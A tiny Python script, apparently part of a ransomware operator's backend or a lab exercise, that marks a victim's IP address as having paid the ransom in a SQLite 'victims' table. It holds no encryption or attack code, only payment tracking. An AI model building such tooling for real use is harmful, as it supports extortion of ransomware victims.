import sqlite3
import os

def pay_ransom(client_ip):
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        db_path = os.path.join(current_dir, "ransomware_database.db")
        
        db = sqlite3.connect(db_path)
        cursor = db.cursor()
        
        sql = "UPDATE victims SET has_paid = 1 WHERE ip_address = ?"
        cursor.execute(sql, (client_ip,))
        
        db.commit()
        print(f"Success! Victim {client_ip} has officially PAID the ransom.")
        
    except sqlite3.Error as e:
        print(f"Database error: {e}")
    finally:
        if 'db' in locals():
            db.close()

pay_ransom("127.0.0.1")